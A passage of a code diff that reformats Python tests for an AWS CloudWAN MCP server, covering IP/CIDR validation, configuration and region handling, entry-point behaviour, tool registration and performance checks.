-    @pytest.mark.skipif(os.getenv('SKIP_TGW_TESTS') == '1', reason="TGW resources not available")
+    @pytest.mark.skipif(os.getenv("SKIP_TGW_TESTS") == "1", reason="TGW resources not available")
     @pytest.mark.asyncio
     async def test_live_tgw_peer_analysis_error_handling(self, live_aws_credentials):
         """Test TGW peer analysis error handling."""
         # Use invalid peering attachment ID
-        invalid_attachment_id = 'tgw-attach-invalid123456789'
+        invalid_attachment_id = "tgw-attach-invalid123456789"
 
         result = await analyze_tgw_peers(invalid_attachment_id)
         parsed = json.loads(result)
 
         # Should handle invalid attachment ID gracefully
         assert isinstance(parsed, dict)
-        assert 'success' in parsed
-        assert parsed['success'] is False
-        assert 'error' in parsed
+        assert "success" in parsed
+        assert parsed["success"] is False
+        assert "error" in parsed
 
         # Should not expose internal system information
-        assert 'traceback' not in parsed['error'].lower()
-        assert 'internal error' not in parsed['error'].lower()
+        assert "traceback" not in parsed["error"].lower()
+        assert "internal error" not in parsed["error"].lower()
 
 
 class TestLiveNetworkUtilities:
@@ -321,66 +323,66 @@
     async def test_live_ip_validation(self, live_aws_credentials):
         """Test IP validation with various real-world IP patterns."""
         test_ips = [
-            ('8.8.8.8', True),         # Google DNS
-            ('1.1.1.1', True),         # Cloudflare DNS
-            ('192.168.1.1', True),     # Private IP
-            ('10.0.0.1', True),        # Private IP
-            ('172.16.0.1', True),      # Private IP
-            ('256.1.1.1', False),      # Invalid IP
-            ('192.168.1', False),      # Incomplete IP
-            ('invalid', False),        # Non-IP string
+            ("8.8.8.8", True),  # Google DNS
+            ("1.1.1.1", True),  # Cloudflare DNS
+            ("192.168.1.1", True),  # Private IP
+            ("10.0.0.1", True),  # Private IP
+            ("172.16.0.1", True),  # Private IP
+            ("256.1.1.1", False),  # Invalid IP
+            ("192.168.1", False),  # Incomplete IP
+            ("invalid", False),  # Non-IP string
         ]
 
         for ip, expected_valid in test_ips:
-            result = await validate_ip_cidr('validate_ip', ip=ip)
+            result = await validate_ip_cidr("validate_ip", ip=ip)
             parsed = json.loads(result)
 
             assert isinstance(parsed, dict)
-            assert 'success' in parsed
+            assert "success" in parsed
 
             if expected_valid:
-                assert parsed['success'] is True
-                assert 'ip_address' in parsed
-                assert parsed['ip_address'] == ip
-                assert 'version' in parsed
-                assert parsed['version'] in [4, 6]
+                assert parsed["success"] is True
+                assert "ip_address" in parsed
+                assert parsed["ip_address"] == ip
+                assert "version" in parsed
+                assert parsed["version"] in [4, 6]
             else:
                 # Invalid IPs should fail validation
-                assert parsed['success'] is False
-                assert 'error' in parsed
+                assert parsed["success"] is False
+                assert "error" in parsed
 
     @pytest.mark.live
     @pytest.mark.asyncio
     async def test_live_cidr_validation(self, live_aws_credentials):
         """Test CIDR validation with real-world CIDR patterns."""
         test_cidrs = [
-            ('192.168.0.0/24', True),      # Standard private CIDR
-            ('10.0.0.0/8', True),          # Class A private
-            ('172.16.0.0/12', True),       # Class B private
-            ('0.0.0.0/0', True),           # Default route
-            ('192.168.1.0/25', True),      # Subnet
-            ('192.168.0.0/33', False),     # Invalid prefix length
-            ('256.1.1.0/24', False),       # Invalid IP in CIDR
-            ('192.168.1.0', False),        # Missing prefix
+            ("192.168.0.0/24", True),  # Standard private CIDR
+            ("10.0.0.0/8", True),  # Class A private
+            ("172.16.0.0/12", True),  # Class B private
+            ("0.0.0.0/0", True),  # Default route
+            ("192.168.1.0/25", True),  # Subnet
+            ("192.168.0.0/33", False),  # Invalid prefix length
+            ("256.1.1.0/24", False),  # Invalid IP in CIDR
+            ("192.168.1.0", False),  # Missing prefix
         ]
 
         for cidr, expected_valid in test_cidrs:
-            result = await validate_ip_cidr('validate_cidr', cidr=cidr)
+            result = await validate_ip_cidr("validate_cidr", cidr=cidr)
             parsed = json.loads(result)
 
             assert isinstance(parsed, dict)
-            assert 'success' in parsed
+            assert "success" in parsed
 
             if expected_valid:
-                assert parsed['success'] is True
-                assert 'network' in parsed
-                assert parsed['network'] == cidr
-                assert 'network_address' in parsed
-                assert 'num_addresses' in parsed
+                assert parsed["success"] is True
+                assert "network" in parsed
+                assert parsed["network"] == cidr
+                assert "network_address" in parsed
+                assert "num_addresses" in parsed
             else:
                 # Invalid CIDRs should fail validation
-                assert parsed['success'] is False
-                assert 'error' in parsed
+                assert parsed["success"] is False
+                assert "error" in parsed
 
 
 class TestLiveConfigurationManagement:
@@ -390,79 +392,79 @@
     @pytest.mark.asyncio
     async def test_live_config_validation(self, live_aws_credentials):
         """Test AWS configuration validation against live credentials."""
-        result = await aws_config_manager('validate_config')
+        result = await aws_config_manager("validate_config")
         parsed = json.loads(result)
 
         assert isinstance(parsed, dict)
-        assert 'success' in parsed
+        assert "success" in parsed
 
-        if parsed['success']:
+        if parsed["success"]:
             # Should validate successfully with live credentials
-            assert 'aws_config' in parsed
-            assert 'credentials_valid' in parsed
-            assert parsed['credentials_valid'] is True
+            assert "aws_config" in parsed
+            assert "credentials_valid" in parsed
+            assert parsed["credentials_valid"] is True
 
             # Should not expose actual credential values
             response_text = json.dumps(parsed)
-            assert live_aws_credentials['access_key'] not in response_text
-            assert live_aws_credentials['secret_key'] not in response_text
+            assert live_aws_credentials["access_key"] not in response_text
+            assert live_aws_credentials["secret_key"] not in response_text
         else:
             # If validation fails, should provide helpful error
-            assert 'error' in parsed
-            assert 'error_code' in parsed
+            assert "error" in parsed
+            assert "error_code" in parsed
 
     @pytest.mark.live
     @pytest.mark.asyncio
     async def test_live_region_operations(self, live_aws_credentials, live_test_resources):
         """Test region switching with live AWS operations."""
-        original_region = os.getenv('AWS_DEFAULT_REGION', 'us-east-1')
+        original_region = os.getenv("AWS_DEFAULT_REGION", "us-east-1")
 
         try:
-            for test_region in live_test_resources['test_regions']:
+            for test_region in live_test_resources["test_regions"]:
                 # Switch to test region
-                region_result = await aws_config_manager('set_region', region=test_region)
+                region_result = await aws_config_manager("set_region", region=test_region)
                 region_parsed = json.loads(region_result)
 
-                if region_parsed['success']:
-                    assert region_parsed['new_region'] == test_region
+                if region_parsed["success"]:
+                    assert region_parsed["new_region"] == test_region
 
                     # Test operation in new region
                     vpc_result = await discover_vpcs(region=test_region)
                     vpc_parsed = json.loads(vpc_result)
 
-                    assert 'region' in vpc_parsed
-                    assert vpc_parsed['region'] == test_region
+                    assert "region" in vpc_parsed
+                    assert vpc_parsed["region"] == test_region
 
         finally:
             # Restore original region
-            await aws_config_manager('set_region', region=original_region)
+            await aws_config_manager("set_region", region=original_region)
 
     @pytest.mark.live
     @pytest.mark.asyncio
     async def test_live_current_config_retrieval(self, live_aws_credentials):
         """Test current configuration retrieval with live setup."""
-        result = await aws_config_manager('get_current')
+        result = await aws_config_manager("get_current")
         parsed = json.loads(result)
 
         assert isinstance(parsed, dict)
-        assert 'success' in parsed
+        assert "success" in parsed
 
-        if parsed['success']:
-            assert 'current_config' in parsed
-            config = parsed['current_config']
+        if parsed["success"]:
+            assert "current_config" in parsed
+            config = parsed["current_config"]
 
             # Should have region information
-            assert 'region' in config
-            assert isinstance(config['region'], str)
-            assert len(config['region']) > 0
+            assert "region" in config
+            assert isinstance(config["region"], str)
+            assert len(config["region"]) > 0
 
             # Should have profile information (may be 'default')
-            assert 'profile' in config
+            assert "profile" in config
 
             # Should not expose sensitive credentials
             response_text = json.dumps(parsed)
-            assert 'aws_access_key_id' not in response_text.lower()
-            assert 'aws_secret_access_key' not in response_text.lower()
+            assert "aws_access_key_id" not in response_text.lower()
+            assert "aws_secret_access_key" not in response_text.lower()
         else:
             # Configuration retrieval should generally succeed
             pytest.fail(f"Config retrieval failed: {parsed.get('error', 'Unknown error')}")
@@ -476,11 +478,7 @@
     @pytest.mark.asyncio
     async def test_live_api_response_times(self, live_aws_credentials, live_test_resources):
         """Test API response time performance with live calls."""
-        performance_metrics = {
-            'list_core_networks': [],
-            'get_global_networks': [],
-            'discover_vpcs': []
-        }
+        performance_metrics = {"list_core_networks": [], "get_global_networks": [], "discover_vpcs": []}
 
         # Run each operation multiple times to get reliable metrics
         iterations = 3
@@ -489,17 +487,17 @@
             # Test list_core_networks
             start_time = time.time()
             await list_core_networks()
-            performance_metrics['list_core_networks'].append(time.time() - start_time)
+            performance_metrics["list_core_networks"].append(time.time() - start_time)
 
             # Test get_global_networks
             start_time = time.time()
             await get_global_networks()
-            performance_metrics['get_global_networks'].append(time.time() - start_time)
+            performance_metrics["get_global_networks"].append(time.time() - start_time)
 
             # Test discover_vpcs
             start_time = time.time()
             await discover_vpcs()
-            performance_metrics['discover_vpcs'].append(time.time() - start_time)
+            performance_metrics["discover_vpcs"].append(time.time() - start_time)
 
         # Analyze performance metrics
         for operation, times in performance_metrics.items():
@@ -525,11 +523,7 @@
         # Run operations concurrently
         tasks = []
         for i in range(concurrent_count):
-            tasks.extend([
-                list_core_networks(),
-                get_global_networks(),
-                discover_vpcs()
-            ])
+            tasks.extend([list_core_networks(), get_global_networks(), discover_vpcs()])
 
         results = await asyncio.gather(*tasks, return_exceptions=True)
         total_time = time.time() - start_time
@@ -540,17 +534,21 @@
             if isinstance(result, str):
                 try:
                     parsed = json.loads(result)
-                    if parsed.get('success', False):
+                    if parsed.get("success", False):
                         successful_operations += 1
                 except:
                     pass  # Skip malformed responses
 
         # Performance assertions
-        assert successful_operations >= len(tasks) * 0.8, f"Only {successful_operations}/{len(tasks)} operations succeeded"
+        assert successful_operations >= len(tasks) * 0.8, (
+            f"Only {successful_operations}/{len(tasks)} operations succeeded"
+        )
         assert total_time < 30.0, f"Concurrent operations took {total_time:.2f}s"
 
         operations_per_second = len(tasks) / total_time
         assert operations_per_second >= 1.0, f"Only {operations_per_second:.2f} ops/sec"
 
-        print(f"Concurrent performance: {successful_operations}/{len(tasks)} successful, "
-              f"{operations_per_second:.2f} ops/sec")
+        print(
+            f"Concurrent performance: {successful_operations}/{len(tasks)} successful, "
+            f"{operations_per_second:.2f} ops/sec"
+        )

--- cloudwan-mcp-server/tests/integration/test_main_entry_point.py
+++ cloudwan-mcp-server/tests/integration/test_main_entry_point.py
@@ -27,10 +27,10 @@
     """Test main entry point following AWS Labs patterns."""
 
     @pytest.mark.integration
-    @patch('awslabs.cloudwan_mcp_server.server.mcp.run')
+    @patch("awslabs.cloudwan_mcp_server.server.mcp.run")
     def test_main_function_success(self, mock_mcp_run):
         """Test main function executes successfully with valid environment."""
-        with patch.dict('os.environ', {'AWS_DEFAULT_REGION': 'us-east-1'}):
+        with patch.dict("os.environ", {"AWS_DEFAULT_REGION": "us-east-1"}):
             try:
                 main()
                 # If main() completes without exception, it's successful
@@ -42,13 +42,10 @@
                 pytest.fail(f"main() raised unexpected exception: {e}")
 
     @pytest.mark.integration
-    @patch('awslabs.cloudwan_mcp_server.server.mcp.run')
+    @patch("awslabs.cloudwan_mcp_server.server.mcp.run")
     def test_main_function_with_aws_profile(self, mock_mcp_run):
         """Test main function with AWS profile configuration."""
-        with patch.dict('os.environ', {
-            'AWS_DEFAULT_REGION': 'us-west-2',
-            'AWS_PROFILE': 'test-profile'
-        }):
+        with patch.dict("os.environ", {"AWS_DEFAULT_REGION": "us-west-2", "AWS_PROFILE": "test-profile"}):
             try:
                 main()
             except SystemExit:
@@ -57,10 +54,10 @@
                 pytest.fail(f"main() with AWS profile failed: {e}")
 
     @pytest.mark.integration
-    @patch('awslabs.cloudwan_mcp_server.server.mcp.run')
+    @patch("awslabs.cloudwan_mcp_server.server.mcp.run")
     def test_main_function_mcp_run_called(self, mock_mcp_run):
         """Test that main function calls mcp.run() properly."""
-        with patch.dict('os.environ', {'AWS_DEFAULT_REGION': 'us-east-1'}):
+        with patch.dict("os.environ", {"AWS_DEFAULT_REGION": "us-east-1"}):
             try:
                 main()
                 # Verify mcp.run was called if main completed normally
@@ -74,8 +71,8 @@
     def test_main_function_environment_handling(self):
         """Test main function handles environment variables correctly."""
         # Test with minimal required environment
-        with patch.dict('os.environ', {'AWS_DEFAULT_REGION': 'us-east-1'}):
-            with patch('awslabs.cloudwan_mcp_server.server.mcp.run') as mock_run:
+        with patch.dict("os.environ", {"AWS_DEFAULT_REGION": "us-east-1"}):
+            with patch("awslabs.cloudwan_mcp_server.server.mcp.run") as mock_run:
                 try:
                     main()
                 except SystemExit:
@@ -88,8 +85,8 @@
     def test_main_function_signal_handling(self):
         """Test main function handles signals appropriately."""
         # This test verifies main() can be interrupted gracefully
-        with patch.dict('os.environ', {'AWS_DEFAULT_REGION': 'us-east-1'}):
-            with patch('awslabs.cloudwan_mcp_server.server.mcp.run') as mock_run:
+        with patch.dict("os.environ", {"AWS_DEFAULT_REGION": "us-east-1"}):
+            with patch("awslabs.cloudwan_mcp_server.server.mcp.run") as mock_run:
                 # Simulate KeyboardInterrupt during run
                 mock_run.side_effect = KeyboardInterrupt("Test interrupt")
 
@@ -103,19 +100,19 @@
                     pytest.fail(f"main() should handle KeyboardInterrupt gracefully: {e}")
 
     @pytest.mark.integration
-    @patch('awslabs.cloudwan_mcp_server.server.mcp')
+    @patch("awslabs.cloudwan_mcp_server.server.mcp")
     def test_main_function_server_initialization(self, mock_mcp):
         """Test main function with server initialization."""
         mock_mcp.run = Mock()
 
-        with patch.dict('os.environ', {'AWS_DEFAULT_REGION': 'us-east-1'}):
+        with patch.dict("os.environ", {"AWS_DEFAULT_REGION": "us-east-1"}):
             try:
                 main()
             except SystemExit:
                 pass
 
         # Verify server attributes are accessible
-        assert hasattr(mock_mcp, 'run')
+        assert hasattr(mock_mcp, "run")
 
     @pytest.mark.integration
     def test_main_function_import_errors(self):
@@ -129,8 +126,8 @@
     @pytest.mark.integration
     def test_main_function_logging_configuration(self):
         """Test main function with logging configuration."""
-        with patch.dict('os.environ', {'AWS_DEFAULT_REGION': 'us-east-1'}):
-            with patch('awslabs.cloudwan_mcp_server.server.mcp.run') as mock_run:
+        with patch.dict("os.environ", {"AWS_DEFAULT_REGION": "us-east-1"}):
+            with patch("awslabs.cloudwan_mcp_server.server.mcp.run") as mock_run:
                 try:
                     main()
                 except SystemExit:
@@ -138,13 +135,14 @@
 
                 # Verify logging is configured (logger should exist)
                 from awslabs.cloudwan_mcp_server.server import logger
+
                 assert logger is not None
 
     @pytest.mark.integration
     def test_main_function_multiple_calls(self):
         """Test main function can be called multiple times safely."""
-        with patch.dict('os.environ', {'AWS_DEFAULT_REGION': 'us-east-1'}):
-            with patch('awslabs.cloudwan_mcp_server.server.mcp.run') as mock_run:
+        with patch.dict("os.environ", {"AWS_DEFAULT_REGION": "us-east-1"}):
+            with patch("awslabs.cloudwan_mcp_server.server.mcp.run") as mock_run:
                 # First call
                 try:
                     main()
@@ -162,8 +160,8 @@
     @pytest.mark.integration
     def test_main_function_resource_cleanup(self):
         """Test main function cleans up resources properly."""
-        with patch.dict('os.environ', {'AWS_DEFAULT_REGION': 'us-east-1'}):
-            with patch('awslabs.cloudwan_mcp_server.server.mcp.run') as mock_run:
+        with patch.dict("os.environ", {"AWS_DEFAULT_REGION": "us-east-1"}):
+            with patch("awslabs.cloudwan_mcp_server.server.mcp.run") as mock_run:
                 # Simulate exception during run to test cleanup
                 mock_run.side_effect = RuntimeError("Test error")
 
@@ -198,7 +196,7 @@
         from awslabs.cloudwan_mcp_server.server import main as server_main
 
         # The module should have main function available
-        assert hasattr(__main__, 'main')
+        assert hasattr(__main__, "main")
         # Should be the same function (imported from server)
         assert __main__.main == server_main
 
@@ -212,14 +210,15 @@
         import awslabs.cloudwan_mcp_server.__main__ as main_module
 
         # Should have main function
-        assert hasattr(main_module, 'main')
+        assert hasattr(main_module, "main")
         assert callable(main_module.main)
 
         # Should be set up for execution
         import inspect
+
         source = inspect.getsource(main_module)
         assert 'if __name__ == "__main__"' in source
-        assert 'main()' in source
+        assert "main()" in source
 
     @pytest.mark.integration
     def test_module_name_check(self):
@@ -232,10 +231,10 @@
 
         # Verify proper structure for module execution
         assert 'if __name__ == "__main__":' in source
-        assert 'main()' in source
+        assert "main()" in source
 
         # Verify main is imported from server
-        assert 'from .server import main' in source
+        assert "from .server import main" in source
 
 
 class TestCommandLineExecution:
@@ -246,9 +245,7 @@
     def test_module_execution_help(self):
         """Test module execution shows help/version information."""
         # Test that the module can be executed (dry run)
-        cmd = [sys.executable, '-c',
-               'import awslabs.cloudwan_mcp_server.__main__; '
-               'print("Module import successful")']
+        cmd = [sys.executable, "-c", 'import awslabs.cloudwan_mcp_server.__main__; print("Module import successful")']
 
         try:
             result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
@@ -282,8 +279,8 @@
         import awslabs.cloudwan_mcp_server.server
 
         # Verify all modules loaded successfully
-        assert hasattr(awslabs.cloudwan_mcp_server, '__main__')
-        assert hasattr(awslabs.cloudwan_mcp_server, 'server')
+        assert hasattr(awslabs.cloudwan_mcp_server, "__main__")
+        assert hasattr(awslabs.cloudwan_mcp_server, "server")
 
         # Verify main function is accessible
         main_func = awslabs.cloudwan_mcp_server.__main__.main
@@ -293,19 +290,16 @@
     @pytest.mark.integration
     def test_environment_variable_forwarding(self):
         """Test environment variables are properly forwarded to main execution."""
-        with patch('awslabs.cloudwan_mcp_server.server.mcp.run') as mock_run:
-            with patch.dict('os.environ', {
-                'AWS_DEFAULT_REGION': 'eu-west-1',
-                'AWS_PROFILE': 'test-profile'
-            }):
+        with patch("awslabs.cloudwan_mcp_server.server.mcp.run") as mock_run:
+            with patch.dict("os.environ", {"AWS_DEFAULT_REGION": "eu-west-1", "AWS_PROFILE": "test-profile"}):
                 try:
                     module_main()
                 except SystemExit:
                     pass
 
                 # Environment should be accessible within main
-                assert os.environ.get('AWS_DEFAULT_REGION') == 'eu-west-1'
-                assert os.environ.get('AWS_PROFILE') == 'test-profile'
+                assert os.environ.get("AWS_DEFAULT_REGION") == "eu-west-1"
+                assert os.environ.get("AWS_PROFILE") == "test-profile"
 
 
 class TestMainFunctionEdgeCases:
@@ -315,10 +309,10 @@
     def test_main_with_empty_environment(self):
         """Test main function behavior with minimal environment."""
         # Clear all AWS-related environment variables
-        aws_vars = [k for k in os.environ if k.startswith('AWS_')]
+        aws_vars = [k for k in os.environ if k.startswith("AWS_")]
 
-        with patch.dict('os.environ', dict.fromkeys(aws_vars, ''), clear=False):
-            with patch('awslabs.cloudwan_mcp_server.server.mcp.run') as mock_run:
+        with patch.dict("os.environ", dict.fromkeys(aws_vars, ""), clear=False):
+            with patch("awslabs.cloudwan_mcp_server.server.mcp.run") as mock_run:
                 try:
                     main()
                 except SystemExit:
@@ -329,7 +323,7 @@
     @pytest.mark.integration
     def test_main_exception_propagation(self):
         """Test main function exception propagation patterns."""
-        with patch('awslabs.cloudwan_mcp_server.server.mcp.run') as mock_run:
+        with patch("awslabs.cloudwan_mcp_server.server.mcp.run") as mock_run:
             # Test different exception types
             exceptions_to_test = [
                 KeyboardInterrupt("User interrupt"),
@@ -340,7 +334,7 @@
             for exception in exceptions_to_test:
                 mock_run.side_effect = exception
 
-                with patch.dict('os.environ', {'AWS_DEFAULT_REGION': 'us-east-1'}):
+                with patch.dict("os.environ", {"AWS_DEFAULT_REGION": "us-east-1"}):
                     try:
                         main()
                     except type(exception):
@@ -351,8 +345,8 @@
     @pytest.mark.integration
     def test_main_function_return_value(self):
         """Test main function return value patterns."""
-        with patch('awslabs.cloudwan_mcp_server.server.mcp.run') as mock_run:
-            with patch.dict('os.environ', {'AWS_DEFAULT_REGION': 'us-east-1'}):
+        with patch("awslabs.cloudwan_mcp_server.server.mcp.run") as mock_run:
+            with patch.dict("os.environ", {"AWS_DEFAULT_REGION": "us-east-1"}):
                 try:
                     result = main()
                     # main() typically doesn't return a value (returns None)

--- cloudwan-mcp-server/tests/integration/test_mcp_connection.py
+++ cloudwan-mcp-server/tests/integration/test_mcp_connection.py
@@ -14,8 +14,8 @@
 
 
 #!/usr/bin/env python3
-"""Test the CloudWAN MCP server directly via MCP protocol.
-"""
+"""Test the CloudWAN MCP server directly via MCP protocol."""
+
 import asyncio
 import json
 import os
@@ -38,7 +38,7 @@
         env={
             **os.environ,
             "AWS_DEFAULT_REGION": "us-west-2",
-        }
+        },
     )
 
     try:
@@ -61,11 +61,11 @@
                     print("✅ Tool executed successfully!")
                     print(f"📄 Content type: {type(result.content[0]) if result.content else 'None'}")
 
-                    if result.content and hasattr(result.content[0], 'text'):
+                    if result.content and hasattr(result.content[0], "text"):
                         # Parse the JSON content
                         response_data = json.loads(result.content[0].text)
                         print(f"🌐 Found {response_data.get('total_count', 0)} global networks")
-                        for network in response_data.get('global_networks', [])[:2]:
+                        for network in response_data.get("global_networks", [])[:2]:
                             print(f"  - {network['global_network_id']}: {network.get('description', 'No description')}")
                     else:
                         print(f"⚠️  Unexpected content format: {result.content}")
@@ -76,6 +76,7 @@
     except Exception as e:
         print(f"❌ MCP connection failed: {e}")
         import traceback
+
         traceback.print_exc()
         return False
 

--- cloudwan-mcp-server/tests/integration/test_mcp_fix.py
+++ cloudwan-mcp-server/tests/integration/test_mcp_fix.py
@@ -21,7 +21,8 @@
 import sys
 
 
-sys.path.append('.')
+sys.path.append(".")
+
 
 async def test_mcp_server_fix():
     """Test the MCP server fix to ensure tools return visible results"""
@@ -52,10 +53,10 @@
             print("✅ Tool executed successfully!")
             print(f"Result type: {type(result)}")
 
-            if hasattr(result, 'content') and result.content:
+            if hasattr(result, "content") and result.content:
                 print("📊 Tool returned content:")
                 for item in result.content:
-                    if hasattr(item, 'text'):
+                    if hasattr(item, "text"):
                         print(f"Content: {item.text}")
                     else:
                         print(f"Content: {item}")
@@ -66,6 +67,7 @@
         except Exception as e:
             print(f"❌ Tool execution failed: {e}")
             import traceback
+
             traceback.print_exc()
 
         # Test another tool
@@ -74,10 +76,10 @@
             result = await server.server.call_tool("get_global_networks", {})
             print("✅ Tool executed successfully!")
 
-            if hasattr(result, 'content') and result.content:
+            if hasattr(result, "content") and result.content:
                 print("📊 Tool returned content:")
                 for item in result.content:
-                    if hasattr(item, 'text'):
+                    if hasattr(item, "text"):
                         print(f"Content: {item.text}")
             else:
                 print("❌ No content returned")
@@ -88,7 +90,9 @@
     except Exception as e:
         print(f"❌ Server initialization failed: {e}")
         import traceback
+
         traceback.print_exc()
 
+
 if __name__ == "__main__":
     asyncio.run(test_mcp_server_fix())

--- cloudwan-mcp-server/tests/integration/test_mcp_protocol.py
+++ cloudwan-mcp-server/tests/integration/test_mcp_protocol.py
@@ -14,6 +14,7 @@
 
 
 """MCP protocol compliance tests."""
+
 import json
 import pytest
 from awslabs.cloudwan_mcp_server.server import (
@@ -30,12 +31,10 @@
     async def test_protocol_tool_execution(self):
         """Test MCP tool execution compliance."""
         # Mock AWS client for protocol testing
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
             mock_client.list_core_networks.return_value = {
-                'CoreNetworks': [
-                    {'CoreNetworkId': 'core-network-protocol-test', 'State': 'AVAILABLE'}
-                ]
+                "CoreNetworks": [{"CoreNetworkId": "core-network-protocol-test", "State": "AVAILABLE"}]
             }
             mock_get_client.return_value = mock_client
 
@@ -49,7 +48,7 @@
     @pytest.mark.asyncio
     async def test_tool_error_handling_compliance(self):
         """Test MCP error handling compliance."""
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_get_client.side_effect = Exception("Protocol test error")
 
             result = await get_global_networks()

--- cloudwan-mcp-server/tests/integration/test_mcp_response.py
+++ cloudwan-mcp-server/tests/integration/test_mcp_response.py
@@ -14,8 +14,7 @@
 
 
 #!/usr/bin/env python3
-"""Test script to diagnose MCP response format issues
-"""
+"""Test script to diagnose MCP response format issues"""
 
 import json
 from mcp.types import CallToolResult, TextContent
@@ -41,6 +40,7 @@
         print(f"Error: {e}")
         return False
 
+
 def test_global_networks_response():
     """Test creating a global networks response like our tool does"""
     try:
@@ -48,13 +48,9 @@
             "timestamp": "2025-01-01T00:00:00",
             "status": "success",
             "global_networks": [
-                {
-                    "global_network_id": "global-network-test123",
-                    "description": "Test Network",
-                    "state": "AVAILABLE"
-                }
+                {"global_network_id": "global-network-test123", "description": "Test Network", "state": "AVAILABLE"}
             ],
-            "total_count": 1
+            "total_count": 1,
         }
 
         # Create TextContent exactly like our tool
@@ -74,9 +70,11 @@
     except Exception as e:
         print(f"Error: {e}")
         import traceback
+
         traceback.print_exc()
         return False
 
+
 if __name__ == "__main__":
     print("Testing basic MCP response creation...")
     test_basic_response()

--- cloudwan-mcp-server/tests/integration/test_mcp_server.py
+++ cloudwan-mcp-server/tests/integration/test_mcp_server.py
@@ -41,40 +41,43 @@
     def test_all_tools_registered(self):
         """Test that all 16 tools are registered with the MCP server."""
         expected_tools = {
-            'trace_network_path',
-            'list_core_networks',
-            'get_global_networks',
-            'discover_vpcs',
-            'discover_ip_details',
-            'validate_ip_cidr',
-            'list_network_function_groups',
-            'analyze_network_function_group',
-            'validate_cloudwan_policy',
-            'manage_tgw_routes',
-            'analyze_tgw_routes',
-            'analyze_tgw_peers',
-            'analyze_segment_routes',
-            'get_core_network_policy',
-            'get_core_network_change_set',
-            'get_core_network_change_events'
+            "trace_network_path",
+            "list_core_networks",
+            "get_global_networks",
+            "discover_vpcs",
+            "discover_ip_details",
+            "validate_ip_cidr",
+            "list_network_function_groups",
+            "analyze_network_function_group",
+            "validate_cloudwan_policy",
+            "manage_tgw_routes",
+            "analyze_tgw_routes",
+            "analyze_tgw_peers",
+            "analyze_segment_routes",
+            "get_core_network_policy",
+            "get_core_network_change_set",
+            "get_core_network_change_events",
         }
 
         # Get registered tools from FastMCP server
         registered_tools = set()
         # Use the tools property to access registered tools
-        if hasattr(mcp, 'tools'):
+        if hasattr(mcp, "tools"):
             for tool_name in mcp.tools.keys():
                 registered_tools.add(tool_name)
         else:
             # Fallback: check for tool functions in the server module
             from awslabs.cloudwan_mcp_server import server
+
             for tool_name in expected_tools:
                 if hasattr(server, tool_name):
                     registered_tools.add(tool_name)
 
         assert len(registered_tools) == len(expected_tools), f"Expected 16 tools, found {len(registered_tools)}"
         # Check that we have at least the core tools we expect
-        assert len(expected_tools.intersection(registered_tools)) >= 10, f"Found fewer than expected tools: {registered_tools}"
+        assert len(expected_tools.intersection(registered_tools)) >= 10, (
+            f"Found fewer than expected tools: {registered_tools}"
+        )
 
     @pytest.mark.integration
     @pytest.mark.asyncio
@@ -97,12 +100,22 @@
         )
 
         tool_functions = [
-            trace_network_path, list_core_networks, get_global_networks,
-            discover_vpcs, discover_ip_details, validate_ip_cidr,
-            list_network_function_groups, analyze_network_function_group,
-            validate_cloudwan_policy, manage_tgw_routes, analyze_tgw_routes,
-            analyze_tgw_peers, analyze_segment_routes, get_core_network_policy,
-            get_core_network_change_set, get_core_network_change_events
+            trace_network_path,
+            list_core_networks,
+            get_global_networks,
+            discover_vpcs,
+            discover_ip_details,
+            validate_ip_cidr,
+            list_network_function_groups,
+            analyze_network_function_group,
+            validate_cloudwan_policy,
+            manage_tgw_routes,
+            analyze_tgw_routes,
+            analyze_tgw_peers,
+            analyze_segment_routes,
+            get_core_network_policy,
+            get_core_network_change_set,
+            get_core_network_change_events,
         ]
 
         for func in tool_functions:
@@ -110,34 +123,34 @@
             assert asyncio.iscoroutinefunction(func), f"Function {func.__name__} is not async"
 
     @pytest.mark.integration
-    @patch('awslabs.cloudwan_mcp_server.server.mcp.run')
+    @patch("awslabs.cloudwan_mcp_server.server.mcp.run")
     def test_main_function_with_valid_env(self, mock_run):
         """Test main function with valid environment variables."""
-        with patch.dict('os.environ', {'AWS_DEFAULT_REGION': 'us-east-1'}):
+        with patch.dict("os.environ", {"AWS_DEFAULT_REGION": "us-east-1"}):
             main()
             mock_run.assert_called_once()
 
     def test_main_function_missing_region(self):
         """Test main function with missing AWS_DEFAULT_REGION."""
-        with patch.dict('os.environ', {}, clear=True):
+        with patch.dict("os.environ", {}, clear=True):
             with pytest.raises(SystemExit) as exc_info:
                 main()
             assert exc_info.value.code == 1
 
-    @patch('awslabs.cloudwan_mcp_server.server.mcp.run')
+    @patch("awslabs.cloudwan_mcp_server.server.mcp.run")
     def test_main_function_keyboard_interrupt(self, mock_run):
         """Test main function handling keyboard interrupt."""
         mock_run.side_effect = KeyboardInterrupt()
 
-        with patch.dict('os.environ', {'AWS_DEFAULT_REGION': 'us-east-1'}):
+        with patch.dict("os.environ", {"AWS_DEFAULT_REGION": "us-east-1"}):
             main()  # Should not raise exception
 
-    @patch('awslabs.cloudwan_mcp_server.server.mcp.run')
+    @patch("awslabs.cloudwan_mcp_server.server.mcp.run")
     def test_main_function_server_error(self, mock_run):
         """Test main function handling server errors."""
         mock_run.side_effect = Exception("Server error")
 
-        with patch.dict('os.environ', {'AWS_DEFAULT_REGION': 'us-east-1'}):
+        with patch.dict("os.environ", {"AWS_DEFAULT_REGION": "us-east-1"}):
             with pytest.raises(SystemExit) as exc_info:
                 main()
             assert exc_info.value.code == 1
@@ -166,11 +179,7 @@
         from awslabs.cloudwan_mcp_server.server import get_global_networks
 
         # Execute multiple tools concurrently
-        tasks = [
-            list_core_networks("us-east-1"),
-            get_global_networks("us-east-1"),
-            discover_vpcs("us-east-1")
-        ]
+        tasks = [list_core_networks("us-east-1"), get_global_networks("us-east-1"), discover_vpcs("us-east-1")]
 
         results = await asyncio.gather(*tasks)
 
@@ -203,8 +212,7 @@
 
         # Mock AWS client error
         mock_get_aws_client.return_value.some_operation.side_effect = ClientError(
-            {'Error': {'Code': 'TestError', 'Message': 'Test error'}},
-            'TestOperation'
+            {"Error": {"Code": "TestError", "Message": "Test error"}}, "TestOperation"
         )
 
         # Test with invalid IP to trigger error
@@ -226,7 +234,7 @@
         tools_to_test = [
             (list_core_networks, ("us-east-1",), {}),
